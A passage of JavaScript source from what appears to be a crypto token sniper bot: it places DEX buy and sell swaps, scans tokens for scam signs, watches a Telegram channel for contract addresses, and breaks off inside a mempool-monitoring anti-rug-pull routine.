              if (choseBlockChain == 3 || choseBlockChain == 2) {
                txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
              } else {
                txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              }

              if (parseInt(process.env.slippage) > 0) {
                amountToBeProccessed = await sellRouterTarget.getAmountsOut(
                  amountIn,
                  [ETHER, tokenAddress]
                )
                amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
              }

              try {
                buytx = await buyRouterTarget.swapExactTokensForTokens(
                  amountIn,
                  amountOutMin,
                  [ETHER,tokenAddress],
                  myAddress,
                  Date.now() + 1000 * 60 * 10,
                  txFees
                )
              } catch (e) {
                console.log(String(e))
                await new Promise(r => setTimeout(r, 400))
                process.exit(0)
              }
              if (choseBlockChain == 3 || choseBlockChain == 2) {
                currentNonce++;
              }
            }
          }
        }
        if (nrOfBuyTransactions > 1 && autoGas == true) {
          if (choseBlockChain == 1) {
            gasPrice = gasPrice.add(i * 100000000);
          } else {
            buyMaxPriorityFeePerGas = buyMaxPriorityFeePerGas.add(i * 100000000);
            buyMaxFeePerGas = buyMaxFeePerGas.add(i * 100000000);
          }
        }
        consoleLog(chalk.green(`Start buying token...`))

        if (choseBlockChain == 3 || choseBlockChain == 2) {
          txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
        } else {
          txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
        }

        if (parseInt(process.env.slippage) > 0) {
          amountToBeProccessed = await sellRouterTarget.getAmountsOut(
            amountIn,
            [ETHER, tokenAddress]
          )
          amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
        }

        try {
          buytx = await buyRouterTarget.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            [ETHER,tokenAddress],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            txFees
          )
        } catch (e) {
          console.log(String(e))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
        if (choseBlockChain == 3 || choseBlockChain == 2) {
          currentNonce++;
        }
        passed = 2;
        await buytx.wait()
      } else {
        if (passed == 1) {
          consoleLog(chalk.green(`Start buying token...`))
          if (snipeExactTokens) {
            amountToBeProccessed = await sellRouterTarget.getAmountsOut(
              amountIn,
              [tokenAddress, ETHER]
            )
            amountToBeProccessed = amountToBeProccessed[1]

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            }

            try {
              buytx = await buyRouterTarget.swapTokensForExactTokens(
                amountIn,
                amountToBeProccessed,
                [ETHER,tokenAddress],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                txFees
              )
            } catch (e) {
              console.log(String(e))
              await new Promise(r => setTimeout(r, 400))
              process.exit(0)
            }
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          } else {

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            }

            if (parseInt(process.env.slippage) > 0) {
              amountToBeProccessed = await sellRouterTarget.getAmountsOut(
                amountIn,
                [ETHER, tokenAddress]
              )
              amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
            }
          
            try {
              buytx = await buyRouterTarget.swapExactTokensForTokens(
                amountIn,
                amountOutMin,
                [ETHER,tokenAddress],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                txFees
              )
              
            } catch (e) {
              console.log(String(e))
              await new Promise(r => setTimeout(r, 400))
              process.exit(0)
            }
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          }
          console.log('Check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
          passed = 2;
          await buytx.wait()
        }

      }
    }
  }
  return true;
}
async function sellFromWallet() {
  let i = 0;
  console.log("Sell from Wallet!")
  if (sellAuto) {
    consoleLog(chalk.green(`Start selling all tokens in ` + chalk.yellow(delaySell) + ' second(s)'))
    await new Promise(r => setTimeout(r, delayOnSellMs))
  }
  if (choseMethode == 1 || (choseMethode == 2 && sendMultiWallet == "false")) {
    if (nrOfSellTransactions > 1) {
      balance = balance.div(nrOfSellTransactions);
    }
    if (exchangeToken == 1) {
      if (nrOfSellTransactions > 1 && passed == 2) {
        for (i = 0; i < (nrOfSellTransactions - 1); i++) {
          if (nrOfSellTransactions > 1 && autoGas == true) {
            gasPriceSell = gasPriceSell.add(i * 100000000);
          }
          consoleLog(chalk.green(`Start selling token...`) + chalk.yellow(i + 1))

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
          }
          try {
            await sellRouterTarget.swapExactTokensForETHSupportingFeeOnTransferTokens(
              balance,
              amountOutMin,
              [tokenAddress, ETHER],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        }
        if (nrOfBuyTransactions > 1 && autoGas == true) {
          if (choseBlockChain == 1) {
            gasPrice = gasPrice.add(i * 100000000);
          } else {
            buyMaxPriorityFeePerGas = buyMaxPriorityFeePerGas.add(i * 100000000);
            buyMaxFeePerGas = buyMaxFeePerGas.add(i * 100000000);
          }
        }

        if (choseBlockChain == 3 || choseBlockChain == 2) {
          txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
        } else {
          txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
        }

        try {
          selltx = await sellRouterTarget.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            amountOutMin,
            [tokenAddress, ETHER],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            txFees
          )
        } catch (e) {
          console.log(String(e))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
        if (choseBlockChain == 3 || choseBlockChain == 2) {
          currentNonce++;
        }
        await selltx.wait()
        consoleLog(chalk.green(`Sucessfully sold all the tokens !\n`))
        passed = 3;
        if (choseMode == 3) {
          consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
          passed = 0;
        } else {
          process.exit(0)
        }

      } else {
        if (passed == 2) {

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
          }
          try {
            selltx = await sellRouterTarget.swapExactTokensForETHSupportingFeeOnTransferTokens(
              balance,
              amountOutMin,
              [tokenAddress, ETHER],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
            await selltx.wait()
            consoleLog(chalk.green(`Sucessfully sold all the tokens !\n`))
            passed = 3;
          } catch (e) {
            console.log(String(e))
            process.exit(0)
          }
          if (choseMode == 3) {
            consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
            passed = 0;
          } else {
            process.exit(0)
          }
        }


      }
    } else {
      if (nrOfSellTransactions > 1 && passed == 2) {
        if (nrOfSellTransactions > 1) {
          balance = balance.div(nrOfSellTransactions);
        }
        for (i = 0; i < (nrOfSellTransactions - 1); i++) {
          if (nrOfSellTransactions > 1 && autoGas == true) {
            gasPriceSell = gasPriceSell.add(i * 100000000);
          }

          consoleLog(chalk.green(`Start selling token...`) + chalk.yellow(i + 1))

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
          }

          try {
            await sellRouterTarget.swapExactTokensForTokensSupportingFeeOnTransferTokens(
              balance,
              amountOutMin,
              [tokenAddress, ETHER],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        }
        if (nrOfSellTransactions > 1 && autoGas == true) {
          gasPriceSell = gasPriceSell.add(i * 100000000);
        }
        consoleLog(chalk.green(`Start selling token...`) + chalk.yellow(i + 1))

        if (choseBlockChain == 3 || choseBlockChain == 2) {
          txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
        } else {
          txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
        }

        try {
          selltx = await sellRouterTarget.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance,
            amountOutMin,
            [tokenAddress, ETHER],
            myAddress,
            Date.now() + 1000 * 60 * 10,
            txFees
          )
        } catch (e) {
          console.log(String(e))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
        if (choseBlockChain == 3 || choseBlockChain == 2) {
          currentNonce++;
        }
        passed = 3;
        await selltx.wait()
        consoleLog(chalk.green(`Sucessfully sold all the tokens !\n`))
        if (choseMode == 3) {
          passed = 0;
        } else {
          process.exit(0)
        }

      } else {
        if (passed == 2) {
          consoleLog(chalk.green(`Start selling token...`) + chalk.yellow(i + 1))

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
          }

          try {
            selltx = await sellRouterTarget.swapExactTokensForTokensSupportingFeeOnTransferTokens(
              balance,
              amountOutMin,
              [tokenAddress, ETHER],
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
          passed = 3;
          await selltx.wait()
          consoleLog(chalk.green(`Sucessfully sold all the tokens !\n`))
          if (choseMode == 3) {
            passed = 0;
          } else {
            process.exit(0)
          }
        }

      }

    }
  }

}

async function buyFromContract() {
  console.log("Buy from Contract!")
  if (autoGas) {

  } else {
    gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
    buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
    buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
  }

  if (choseMethode == 2) {
    if (sendMultiWallet == "true") {
      multiWalletsArray = multiWalletsArray.split(",");
      if (passed == 1) {
        buytx = null;
        if (snipeExactTokens) {
          amountIn = String(process.env.amount_BNB_buy);
          let arraySplit = amountIn.split(",");
          if (arraySplit[1] == undefined) {
            arraySplit = amountIn.split(".")
          }
          let finalNumber = String(arraySplit[0]) + String('0'.padEnd(tokenDecimals, '0'));
          amountIn = ethers.BigNumber.from(finalNumber)

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          }
          buytx = await contractRouter.TradeExactMultipleWallets(
            amountIn,
            [ETHER, tokenAddress],
            multiWalletsArray,
            choseMarket,
            txFees
          )
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        } else {

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          }
          try {
            buytx = await contractRouter.TradeMultipleWalletsFee(
              ETHER,
              tokenAddress,
              amountIn,
              multiWalletsArray,
              choseMarket,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        }

        for (i = 1; i > 0; i++) {
          hash = await provider.getTransactionReceipt(buytx.hash)
          if (hash != null) {
            if (hash.status == 1) {
              console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);

              let arrayLenght = multiWalletsArray.length;
              for (i = 0; i < arrayLenght; i++) {
                balance = await getTokenBalance(tokenAddress, multiWalletsArray[i], provider)
                consoleLog(chalk.green('Total Token balance for ' + multiWalletsArray[i] + ' is ' + chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6)) + '\n'))
              }
              passed = 2;
              return true;
            } else {
              console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
              return false;
            }
          }
        }
      }
    } else {
      if (passed == 1) {
        buytx = null;
        if (snipeExactTokens) {
          amountIn = String(process.env.amount_BNB_buy);
          let arraySplit = amountIn.split(",");
          if (arraySplit[1] == undefined) {
            arraySplit = amountIn.split(".")
          }
          let finalNumber = String(arraySplit[0]) + String('0'.padEnd(tokenDecimals, '0'));
          amountIn = ethers.BigNumber.from(finalNumber)

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          }

          try {
            buytx = await contractRouter.TradeExactMultipleFee(
              amountIn,
              [ETHER, tokenAddress],
              myAddress,
              nrOfBuyTransactions,
              choseMarket,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        } else {

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
          }

          try {
            buytx = await contractRouter.TradeMultipleFee(
              ETHER,
              tokenAddress,
              amountIn,
              nrOfBuyTransactions,
              myAddress,
              choseMarket,
              txFees
            )
          } catch (e) {
            console.log(String(e))
            await new Promise(r => setTimeout(r, 400))
            process.exit(0)
          }
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        }

        for (i = 1; i > 0; i++) {
          hash = await provider.getTransactionReceipt(buytx.hash)
          if (hash != null) {
            if (hash.status == 1) {
              console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
              balance = await getTokenBalance(tokenAddress, myAddress, provider)
              consoleLog(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
              passed = 2;
              return true;
            } else {
              console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
              return false;
            }
          }
        }
      }
    }
  } else if (choseMethode == 3) {
    if (passed == 1) {
      buytx = null;
      if (snipeExactTokens) {
        amountIn = String(process.env.amount_BNB_buy);
        let arraySplit = amountIn.split(",");
        if (arraySplit[1] == undefined) {
          arraySplit = amountIn.split(".")
        }
        let finalNumber = String(arraySplit[0]) + String('0'.padEnd(tokenDecimals, '0'));
        amountIn = ethers.BigNumber.from(finalNumber)

        if (choseBlockChain == 3 || choseBlockChain == 2) {
          txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
        } else {
          txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
        }

        try {
          buytx = await contractRouter.TradeExactMultipleFee(
            amountIn,
            [ETHER, tokenAddress],
            contract,
            nrOfBuyTransactions,
            choseMarket,
            txFees
          )
        } catch (e) {
          console.log(String(e))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
        if (choseBlockChain == 3 || choseBlockChain == 2) {
          currentNonce++;
        }
      } else {

        if (choseBlockChain == 3 || choseBlockChain == 2) {
          txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
        } else {
          txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
        }

        if (choseBlockChain == 2 && (exchangeToken == 2 || exchangeToken == 3)) {
          amountIn = amountIn.div(1000000000000)
        }
        try {
          buytx = await contractRouter.TradeMultipleFee(
            ETHER,
            tokenAddress,
            amountIn,
            nrOfBuyTransactions,
            contract,
            choseMarket,
            txFees
          )
        } catch (e) {
          console.log(String(e))
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
        if (choseBlockChain == 3 || choseBlockChain == 2) {
          currentNonce++;
        }
      }


      for (i = 1; i > 0; i++) {
        hash = await provider.getTransactionReceipt(buytx.hash)
        if (hash != null) {
          if (hash.status == 1) {
            console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
            balance = await getTokenBalance(tokenAddress, contract, provider)
            consoleLog(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
            passed = 2;
            return true;
          } else {
            console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
            return false;
          }
        }
      }
    }

  }
}

async function sellFromContract() {
  console.log("Sell from Contract!")
  if (sellAuto) {
    consoleLog(chalk.green(`Start selling all tokens in ` + chalk.yellow(delaySell) + ' second(s)'))
    await new Promise(r => setTimeout(r, delayOnSellMs))
  }
  if (choseMethode == 3) {

    if (passed == 2) {
      balance = balance.div(nrOfSellTransactions)

      if (choseBlockChain == 3 || choseBlockChain == 2) {
        txFees = { gasLimit: gasLimitSell, maxPriorityFeePerGas: sellMaxPriorityFeePerGas, maxFeePerGas: sellMaxFeePerGas, nonce: currentNonce }
      } else {
        txFees = { gasLimit: gasLimitSell, gasPrice: gasPriceSell, nonce: currentNonce++ }
      }

      try {
        selltx = await contractRouter.TradeMultipleFee(
          tokenAddress,
          ETHER,
          balance,
          nrOfSellTransactions,
          contract,
          choseMarket,
          txFees
        )
      } catch (e) {
        console.log(String(e))
        await new Promise(r => setTimeout(r, 400))
        process.exit(0)
      }
      if (choseBlockChain == 3 || choseBlockChain == 2) {
        currentNonce++;
      }
      for (i = 1; i > 0; i++) {
        hash = await provider.getTransactionReceipt(selltx.hash)
        if (hash != null) {
          if (hash.status == 1) {
            console.log('Success, check your transaction on https://' + chainScanner + '/tx/' + selltx.hash);
            let balanceETHER = await getTokenBalance(ETHER, contract, provider)
            console.log(chalk.green('Total ' + symbolCurrency + ' balance is ' + chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceETHER, 18)).toFixed(6)) + '\n'));
            return true;
          } else {
            console.log('Failed, check your transaction on https://' + chainScanner + '/tx/' + selltx.hash);
            return false;
          }
        }
      }
    }

  }
}

async function getAllTokenInfo2(tokenAddress) {
  //get token Information:
  try {
    tokenDetails = await getMinTokenInfo(TokenContract, provider);
    console.log('Even if we update daily the database with new functions, this scan may not produce an acurate result!');
    console.log('MultiSniper is not responsible if you invest in a scam, please do your DYOR!');
    console.log('This might take a while! Scanning .....');
    console.log('Waiting for Token info:');
    console.log('----------------------------------------------------');
    scanData.nameTokenScan = tokenDetails.name;
    scanData.simbolTokenScan = tokenDetails.symbol;
    scanData.decimalsTokenScan = tokenDetails.decimals;
    scanData.supplyTokenScan = tokenDetails.totalSupply;

  } catch (e) {
    console.log('Token not found! Please check if the contract address is correct!');
    process.exit(0);
  }
  //get owner wallet address:
  try {
    devWallet = await getDevAddresses(TokenContract, provider);
    if (devWallet != null) {

      scanData.DevTokenScan = devWallet.owner;
      devSupply = await getTokenBalance2(TokenContract, devWallet.owner, provider);
      devSupplyPercent = parseFloat(ethers.utils.formatUnits(devSupply, tokenDetails.decimals)) / tokenDetails.totalSupply;

      if (devSupplyPercent > 1) {
        scanData.DevSupplyTokenScan = "More than 1%";
        console.log('Warning!!! Dev Wallet holds more than 1% of the total supply, posible slow rug.');
      } else {
        scanData.DevSupplyTokenScan = "Les than 1%";

      }
    } else {
      scanData.DevTokenScan = 'NotFound';
      scanData.DevSupplyTokenScan = "-";

    }

  } catch (e) {
    scanData.DevTokenScan = 'NotFound';
    scanData.DevSupplyTokenScan = "-";

  }

  //check if contract is verfied and store contract ABI & SOURCE:
  try {
    contractVerfiedStatus = await getBscScanVerfiedStatus(TokenContract);
    if (contractVerfiedStatus == 1) {

      scanData.verifiedTokenScan = "YES";
      sourceCode = await storeContractSource2(TokenContract);
      //console.log(sourceCode[0])
      let storeBigContract = "";
      /*       console.log("Here")
            contractSource = String(sourceCode[0].SourceCode) */
      // 0xb025BC1675F6BE04eC528574712f268D99dB494d
      if (sourceCode[0].SourceCode[0] == '{') {
        // daca e compus din mai multe contracte are un kkt de {
        contractSource = JSON.parse(sourceCode[0].SourceCode);
        for (let key in contractSource) {
          storeBigContract += contractSource[key].content;
        }
        contractSource = storeBigContract;
      } else {
        // daca e compus din un singur contract nu are {
        contractSource = sourceCode[0].SourceCode;
      }

      contractLineByLine = contractSource.split(/\r\n|\r|\n/);

      try {
        const ast = parser.parse(contractSource, { loc: true })

        parser.visit(ast, {
          FunctionDefinition: function (node) {

            //console.log(node)
            let body = getFunctionBody(node.loc.start.line, node.loc.end.line)
            let functionLine = getFunctionLine(node.loc.start.line)
            //functionsDetected.push({name : node.name, start: node.loc.start.line, end: node.loc.end.line, body: body});
            functionsDetected.push({ name: node.name, start: node.loc.start.line, end: node.loc.end.line, body: body, line: node.name + functionLine });
          }
        })


        //console.log(functionsDetected)

        checkForKeyWords(functionsDetected)

      } catch (e) {
        if (e instanceof parser.ParserError) {
          console.error(e.errors)
        }
      }

      abiSource = sourceCode[0].ABI;
    } else {
      scanData.verifiedTokenScan = "NO";
      console.log('Warning!!! Posible scam token, please check if its the real token for the listing!');
    }
  } catch (e) {
    scanData.verifiedTokenScan = "???";
    console.log('Could not check the verified status of the contract! Please check again!');
  }
  // get total holders and store holders + values
  try {
    totalHolders = await getContractHolders(TokenContract);
    if (page > 3) {

      scanData.holdersTokenScan = "Over " + totalHolders;
    } else {
      scanData.holdersTokenScan = totalHolders;

    }

  } catch (e) {
    scanData.holdersTokenScan = '-';

  }

  //get token price
  try {
    tokenPrice = await getTokenPrice2(TokenContract, provider);
    if (typeof tokenPrice == 'number') {
      if (isNaN(tokenPrice)) {
        scanData.priceTokenScan = 'No Liquidity';
      } else {
        scanData.priceTokenScan = tokenPrice.toFixed(15);
      }


    } else {
      scanData.priceTokenScan = 'No Liquidity';

    }

  } catch (e) {
    scanData.priceTokenScan = 'No Liquidity';

  }


}

async function telegramSnipe() {

  //(async () => {
  console.log('---------------------------------------------')
  console.log("Listening to " + tg_channel)
  console.log("Tracking users and admins for Contract Address")
  console.log('---------------------------------------------')
  const client = new TelegramClient(tg_secret_phrase, parseInt(tg_api_id, 10), tg_api_hash, {
    connectionRetries: 5,
  });
  //Here user need to input his number with the country prefix, like in romania is +40 (exemple: +40761111111), after that he will recive a code on telegram app
  await client.start({
    onError: (err) => console.log(err),
  });
  console.log("You should now be connected.");
  //console.log(client.session.save()); // This was from StringSession where you need to save it for no login every time
  await client.sendMessage("me", { message: "Connected!" }); //Gives himself a message with string "Connected!"

  if (tg_channel == "") {
    console.log("ERROR: Please insert name of the Telegram channel");
    return;
  };

  //This array is for the function searchAdmins
  let arrayAdmins = [];

  //This search Admins in telegram channel and return their ids(user id)
  try {
    const searchAdmins = await client.invoke(
      new Api.channels.GetParticipants({
        channel: tg_channel,
        filter: new Api.ChannelParticipantsAdmins({}),
      })
    );
    //Take the admin's id and insert them in array
    for (i = 0; i < searchAdmins.users.length; i++) {
      //console.log(parseInt(searchAdmins.users[i].id)); // prints the result
      arrayAdmins.push(parseInt(searchAdmins.users[i].id, 10));
    };
    console.log(arrayAdmins.length + " ADMINS WAS FOUND!")
  }
  catch (error) {
    //This check is for permissions. This function is not working in all channels, you need some permisions (like to write in chat and see the channel members)
    if (error.errorMessage == "CHAT_ADMIN_REQUIRED") {
      console.log("Please insert the Admin's ID manualy in .env, we couldn't find the ids!");
    }
    else {
      //Normaly don't need to jump here, but if do display the error code and message
      console.log(error.code);
      console.log(error.errorMessage);
      console.log("Unknow Error!");
    };
  };


  // This function is searching for contracts.
  //Listen all message group but if and admin,author or listener user(the listener_user_ids from .env) send a message in chat
  //will return a message like "USER LISTENER MESSAGE (contract address not found): message" or if the message contain a contract address "Contract Address Found: ContractAddress"
  async function searchingForContract(event) {
    //Debuging for ids
    //console.log(event.message);
    //console.log(event);
    //return;

    //Getting the message from event
    const message = event.message.message;
    //Getting the Author from event
    const post_author = event.message.postAuthor;


    //Check if post_author is null, if not display message
    //Will display maxim message.length < 100 and > 1
    if (post_author !== null && post_author !== "") {
      if (message.length > 1 && message.length < 100) {
        console.log("----------------- \nPost Author: " + post_author + ". Message: " + message);
      }
      else {
        console.log("----------------- \nPost Author: " + post_author + ". Message: TOO LONG MESSAGE");
      };
    };

    //Getting the fromId from event
    const from_id = event.message.fromId;

    //Check if from_id is null, if not display message
    //Will display maxim message.length < 100 and > 1
    if (from_id !== null && from_id !== "") {
      //var realID = from_id.userId
      //var user = await client.getEntity(realID)
      //console.log(user)

      //Getting the userId from "from_id"
      var user_id = parseInt(from_id.userId, 10);
      if (message.length > 1 && message.length < 100) {
        // console.log("user_id: " + String(user_id) + ". Message: " + message);
      }
      else {
        //console.log("user_id: " + String(user_id) + ". Message: TOO LONG MESSAGE");
      }
    }
    else if ((post_author === null || post_author === "") && (from_id === null || from_id === "")) {
      user_id = 1000;
    }
    else {
      user_id = -1;
    };


    //Checking the listener,post_author and arrayAdmins lists and compare it with user_id or post_author to know if is need to listen that user or not
    if (listener_user_id_array.includes(user_id) || post_author_id_array.includes(post_author) || arrayAdmins.includes(user_id)) {

      //Searching after keywords and if on of the keywords is found return true
      const search_after_keywords = ["has", "don't buy", "verify", "joined", "welcome"];
      const text_message_keywords = message.toLowerCase();
      const keywords_found = search_after_keywords.some(function (searching_keywords) { return text_message_keywords.indexOf(searching_keywords) > -1; });
      //console.log(keywords_found)

      if (check_for_bad_contracts(message) && keywords_found == false) {
        //console.log("hereeee");
        contractAddressPending = check_for_bad_contracts(message)
        //Check if the contract have words(like (six), (seven) ) instend of numbers and replace them with numbers,
        //after that check if the contract have this special characters "(",")","+", if one of this characters are found they are deleted
        let verifyContract = wordsToNumbers(contractAddressPending);
        verifyContract = verifyContract.replace(/[{()}]/g, '').replace(/\+/g, "");
        TokenContract = null;
        //Checking if the "verifyContract" is the right contract and have the real pattern
        if (check_contract_address(verifyContract)) {
          contractAddress = check_contract_address(verifyContract);
          console.log("Contract Address Found: " + contractAddress);
          TokenContract = contractAddress;
          replaceEnvDataWitoutRestart({ TokenContract: contractAddress, tg_wait_for_contract: false });
          await waitSnipeOnCall()
          /* await client.disconnect();
          process.exit(0) */
          //After the contract address was found will disconnect the session
          //
        }
        else {
          //Displays the listener's(listener,post_author and arrayAdmins) message
          //Will display maxim message.length < 100 and > 1
          //Doesn't matter the length of message, the function will still checking if a contract is there and if it is will be displayed.
          if (message.length > 1 && message.length < 100) {
            console.log("USER LISTENER MESSAGE (contract address not found): " + message);
          }
          else {
            console.log("USER LISTENER MESSAGE (contract address not found): TOO LONG MESSAGE");
          };
        };
      };
    };
  };

  //For Debug! Check list if they look ok;
  //console.log(listener_user_id_array);
  //console.log(post_author_id_array);
  //console.log(arrayAdmins);

  client.addEventHandler(searchingForContract, new NewMessage({ chats: [tg_channel] }));
}

async function antiScam() {
  let startTimeStamp = 0;
  let endTimeStamp = 0;
  console.log("AntiScam!")
  consoleLog(chalk.red(`Monitoring for Rug Pul & BlackList in progress ....\n`));
  if (sellOnfunction) {
    console.log("Frontrunn sell for function call method: " + functionToDetect + " activated!")
  }
  stopLoop = false;
  currentNonce = await getNonce(myAddress);
  if (sellAuto) {
    startTimeStamp = Date.now();
    endTimeStamp = startTimeStamp + (delaySell * 1000);

  }

  provider.off("pending");
  provider.on("pending", async (tx) => {

    startTimeStamp = Date.now();
    const transaction = await provider.getTransaction(tx)
